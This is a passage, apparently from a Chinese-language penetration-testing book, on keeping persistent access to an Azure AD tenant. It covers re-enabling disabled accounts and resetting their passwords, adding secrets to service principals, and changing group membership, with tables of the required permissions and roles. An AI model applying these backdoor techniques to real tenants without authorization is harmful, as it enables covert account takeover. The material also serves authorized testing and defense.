  \ AD身份，这些身份将在账户中持久存在。由于更改现有活动账户的密码是一个非常明显的更改，我们将从更改禁用用户账户的凭据开始。\n\n### 启用禁用的用户身份并重置其密码\n\
  \n为Azure AD租户建立后门身份的一个不太可疑的方法是查找已禁用的现有身份，启用它们并重置其密码。要启用禁用的用户账户，需要下表中突出显示的权限。**Azure\
  \ AD角色**列中列出的内置角色具有此权限。从渗透测试的角度来看，我们需要谨慎，因为一个身份可能因先前已被入侵而被禁用：\n\n| 方法 | 所需权限 | Azure\
  \ AD角色 |\n|---|---|---|\n| 启用禁用的用户身份 | `microsoft.directory/users/enable` | • 用户管理员<br>•\
  \ 全局管理员<br>• 自定义角色目前无法使用 |\n\n表8.3 – 启用禁用用户身份的角色\n\n启用用户身份后，Azure AD中的密码重置权限取决于被重置用户的角色。这些权限在管理员角色（全局管理员、身份验证管理员等）和非管理员用户类型之间进行了区分。\n\
  \n以下是Azure AD中可以重置用户密码的内置角色，按权限升序排列：\n\n- **密码管理员：** 可以为非管理员和其他密码管理员重置密码\n- **服务台管理员：**\
  \ 可以为非管理员、密码管理员和其他服务台管理员重置密码\n- **身份验证管理员：** 可以为非管理员、密码管理员和其他身份验证管理员重置密码\n- **用户管理员：**\
  \ 可以为非管理员、组管理员、服务台管理员、密码管理员和其他用户管理员重置密码\n- **特权身份验证管理员：** 可以为所有非管理员和管理员重置密码\n- **全局管理员：**\
  \ 可以为所有非管理员和管理员重置密码\n\n如果你需要临时访问特权账户以实现持久化目标，请记住，你需要一个特权角色来重置目标账户的凭据。例如，你可能希望使用长期持久化账户来重置特权用户的密码，以在租户中进行短期持久化活动。此路径可能允许临时访问其他账户的资源，但防御者应该很容易追踪发起密码重置的账户。\n\
  \n> **重要说明**\n> \n> 此处列出的角色描述来自以下Microsoft文档页面：`https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#password-reset-permissions`。此页面有一个非常方便的表格，概述了哪些角色有权重置Azure\
  \ AD租户中其他角色的密码。\n\n### 向现有服务主体添加机密\n\n为Azure AD租户建立后门身份的另一种不太可疑的方法是向现有服务主体添加密码。这是你在*第4章，利用读取者权限*中使用PowerZure练习过的方法之一。要执行此操作，需要拥有该服务主体的账户，或具有下表中突出显示权限的账户。Azure\
  \ AD角色列中列出的内置角色具有此权限：\n\n| 方法 | 所需权限 | Azure AD角色 |\n|---|---|---|\n| 向现有服务主体添加机密\
  \ | `microsoft.directory/servicePrincipals/credentials/update` | • 应用程序管理员<br>•\
  \ 混合身份管理员<br>• 全局管理员<br>• 自定义角色目前无法使用 |\n\n表8.4 – 向服务主体添加机密的角色\n\n现在我们已经确定了如何访问身份以实现持久化，让我们看看如何为这些身份分配特权角色。\n\
  \n| 方法 | 所需权限 | Azure AD角色 |\n|---|---|---|\n| 更新可分配给Azure AD角色的组的成员身份和所有权。 | `microsoft.directory/groupsAssign\
  \ ableToRoles/allProperties/update` | • 特权角色管理员<br>• 全局管理员<br>• 自定义角色目前无法使用 |\n\
  | 更新安全组和Microsoft 365组的所有权。这不包括可分配给Azure AD角色的组。 | `microsoft.directory/groups/owners/update`\
  \ | • 目录写入者<br>• 组管理员<br>• 用户管理员<br>• 全局管理员<br>• 自定义角色目前无法使用 |\n| 更新Azure AD中安全组的所有权。这不包括可分配给Azure\
  \ AD角色的组。 | `microsoft.directory/groups.security/owners/update` | • Intune管理员<br>•\
  \ 知识管理者<br>• 知识管理员<br>• 自定义角色也可以分配此权限 |\n| 更新Azure AD中Microsoft 365组的所有权。这不包括可分配给Azure\
  \ AD角色的组。 | `microsoft.directory/groups.unified/owners/update` | • Exchange管理员<br>•\
  \ SharePoint管理员<br>• Teams管理员<br>• 自定义角色也可以分配此权限 |\n\n表8.5 – 修改组成员身份或所有权的角色\n\n\
